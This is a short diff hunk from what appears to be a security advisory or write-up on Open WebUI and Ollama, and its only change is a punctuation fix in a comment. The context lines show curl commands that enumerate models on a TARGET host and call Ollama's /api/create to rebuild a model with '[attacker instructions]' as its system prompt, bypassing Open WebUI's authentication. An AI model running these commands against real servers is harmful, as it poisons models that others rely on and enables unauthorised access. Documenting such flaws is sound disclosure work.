@@ -66,7 +66,7 @@ curl http://TARGET:3000/ollama/api/tags
 curl http://TARGET:11434/api/tags
 # → {"models":[...all models...]}
 
-# Full model injection — unaffected by Open WebUI auth layer
+# Full model injection - unaffected by Open WebUI auth layer
 curl -X POST http://TARGET:11434/api/create \
   -d '{"model":"deepseek-coder:6.7b","from":"deepseek-coder:6.7b",
        "system":"[attacker instructions]"}'
